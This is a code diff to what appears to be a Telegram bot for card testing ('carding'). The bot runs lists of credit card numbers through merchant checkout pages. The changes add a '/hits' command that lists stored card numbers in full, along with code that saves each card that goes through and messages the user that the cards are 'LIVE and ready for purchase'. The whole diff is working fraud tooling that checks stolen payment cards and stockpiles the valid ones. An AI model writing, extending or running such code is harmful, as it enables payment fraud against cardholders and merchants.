@@ -1061,6 +1061,44 @@ router.post('/webhook', async (req, res) => {
       return;
     }
 
+    // Show user's successful hits and saved cards
+    if (msg?.text === '/hits') {
+      try {
+        const userHits = getUserHits(tgId);
+        const userData = getUserData(tgId) || {};
+        const savedCards = userData.savedCards || [];
+
+        let text = `🎯 <b>YOUR SUCCESSFUL HITS</b>\n` +
+          `═══════════════════════\n\n` +
+          `👤 <b>User:</b> ${firstName} (${tgId})\n` +
+          `🎯 <b>Total Hits:</b> ${userHits}\n` +
+          `💾 <b>Saved Cards:</b> ${savedCards.length}\n` +
+          `⏰ <b>Last Updated:</b> ${new Date().toLocaleString()}\n\n`;
+
+        if (savedCards.length > 0) {
+          text += `💳 <b>SAVED LIVE CARDS:</b>\n`;
+          savedCards.forEach((card, index) => {
+            const timestamp = new Date(card.timestamp).toLocaleString();
+            text += `${index + 1}. <code>${card.card}</code>\n` +
+              `   🏪 ${card.merchant} (${card.bin}****${card.lastFour})\n` +
+              `   ⏰ ${timestamp}\n\n`;
+          });
+
+          text += `💰 <b>These cards are ready for purchase!</b>\n`;
+        } else {
+          text += `📭 <b>No saved cards yet.</b>\n` +
+            `💡 <b>Use /co command to find live cards!</b>\n`;
+        }
+
+        text += `\n═══════════════════════`;
+        await sendMessage(BOT_TOKEN, chatId, text);
+        return;
+      } catch (error) {
+        console.error('Error showing hits:', error);
+        await sendMessage(BOT_TOKEN, chatId, '❌ Error retrieving your hits');
+      }
+    }
+
     // Test command for anyone to verify bot is working
     if (msg?.text === '/test') {
       try {
@@ -1320,6 +1358,20 @@ async function processAutoCheckout(userId, checkoutUrl, ccList, chatId) {
 
           hits.push(hitData);
 
+          // Save successful card to user's saved cards
+          try {
+            const userData = getUserData(userId) || {};
+            if (!userData.savedCards) userData.savedCards = [];
+            userData.savedCards.push(hitData);
+            // Keep only last 10 saved cards to prevent bloat
+            if (userData.savedCards.length > 10) {
+              userData.savedCards = userData.savedCards.slice(-10);
+            }
+            setUserData(userId, userData);
+          } catch (error) {
+            console.error('Error saving successful card:', error);
+          }
+
           // Update status with hit
           await updateStatusMessage('CHECKOUT COMPLETE! 🎉', {
             hit: true,
@@ -1413,6 +1465,39 @@ async function processAutoCheckout(userId, checkoutUrl, ccList, chatId) {
         }
       }
     }, 2000);
+
+    // Log successful hits for user reference
+    if (hits.length > 0) {
+      console.log(`[AUTO-CHECKOUT] SUCCESSFUL CARDS FOUND:`);
+      hits.forEach((hit, index) => {
+        console.log(`  ${index + 1}. ${hit.card} - ${hit.merchant} (${hit.bin}****${hit.lastFour})`);
+      });
+
+      // Send successful cards to user
+      const successMessage = `🎯 <b>SUCCESSFUL CARDS FOUND!</b>\n` +
+        `═══════════════════════\n\n`;
+
+      hits.forEach((hit, index) => {
+        successMessage += `${index + 1}. <code>${hit.card}</code>\n` +
+          `   🏪 ${hit.merchant} | ${hit.bin}****${hit.lastFour}\n` +
+          `   ⚡ ${hit.processingTime}ms\n\n`;
+      });
+
+      successMessage += `💰 <b>These cards are LIVE and ready for purchase!</b>\n` +
+        `💾 <b>Cards saved to your account!</b>\n` +
+        `🔗 <b>Checkout:</b> ${checkoutUrl}\n\n` +
+        `💡 <b>Use /hits to view all your saved cards anytime!</b>\n\n` +
+        `═══════════════════════`;
+
+      // Send success message after a delay
+      setTimeout(async () => {
+        try {
+          await sendMessage(BOT_TOKEN, chatId, successMessage);
+        } catch (error) {
+          console.error('Failed to send success message:', error);
+        }
+      }, 3000);
+    }
 
     console.log(`[AUTO-CHECKOUT] Session completed for user ${userId}: ${hits.length} hits, ${declined} declines, ${authRequired} 3DS from ${processed} cards`);
 
